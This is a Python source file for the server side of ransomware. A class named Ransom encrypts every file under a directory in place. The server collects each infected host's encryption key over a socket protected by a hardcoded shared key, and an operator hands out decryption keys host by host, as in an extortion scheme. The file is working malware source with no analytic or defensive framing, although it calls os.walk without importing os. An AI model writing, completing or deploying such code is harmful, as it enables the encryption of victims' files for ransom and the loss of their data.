import socket, json, time, threading
from socket import gethostbyname,gethostname
from cryptography.fernet import Fernet
from hashlib import sha256
from base64 import b64encode


class Ransom(object):
    
    def __init__(self,key):
        hashOfThekey = sha256(key).digest()
        self.key = b64encode(hashOfThekey)
    
    def encrytData(self,data):
        cipherText = Fernet(self.key).encrypt(data)
        return cipherText


    def decryptData(self,data):
        cipherText = Fernet(self.key).decrypt(data)
        return cipherText
        
        
    def encryptFile(self, path):
        data = open(path,'rb').read()
        encryptedData = self.encrytData(data)
        open(path,'wb').write(encryptedData)
    
    
    def decryptFile(self, path):
        data = open(path,'rb').read()
        decData = self.decryptData(data)
        print(type(decData))
        open(path,'wb').write(decData)
        
        
    def encryptDir(self,path):
        for root,_,file in os.walk(path):
            for i in file:
                self.encryptFile(os.path.join(root,i))
                
    def decryptDir(self,path):
        for root,_,file in os.walk(path):
            for i in file:
                self.decryptFile(os.path.join(root,i))
                


SHAREDKEY = b"643bf8a247f67ef78d2902b0fe77f36c8ffbb22f5c5c92378c6784b9a30c38ab"


server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
serverIp = gethostbyname(gethostname())
server.bind((serverIp,888))

server.listen()
print('[+] Server Listening...')


CLIENTS = {}
DECRYPTCLIENTS = []
def sendMsg(msg,conn):
    global SHAREDKEY
    msg = Ransom(SHAREDKEY).encrytData(msg)
    buffer = int.to_bytes(len(msg),4)
    conn.send(buffer)
    conn.send(msg)
    
    
def readMsg(conn):
    global SHAREDKEY
    buffer = int.from_bytes(conn.recv(4))
    msg = conn.recv(buffer)
    msg = Ransom(SHAREDKEY).decryptData(msg)
    return msg

def onConnect(conn):
    global DECRYPTCLIENTS,CLIENTS
    info = readMsg(conn)
    info = json.loads(info.decode())
    host = list(info.keys())[0]
    CLIENTS[host] = info[host]
    while True:
        if host in DECRYPTCLIENTS:
            encyptionKey = info[host].encode() 
            sendMsg(b'Decyption Key = ' + encyptionKey,conn)
            del CLIENTS[host]
            DECRYPTCLIENTS.remove(host)
            print(f'Key was sent to {host}')
            return
        time.sleep(5)
        
def sendDecrypt():
    global DECRYPTCLIENTS,CLIENTS
    while True:
        client = input('Please enter host to send them the key: ')
        if client == 'Get all clients':
            for i in CLIENTS.keys():
                print(i)
        else:
            client = client.split(',')
            DECRYPTCLIENTS += client
    

    
    
T = threading.Thread(target=sendDecrypt)
T.start()
       
while True:
    conn,addr = server.accept()
    T = threading.Thread(target=onConnect,args=(conn,))
    T.start()
    time.sleep(2)
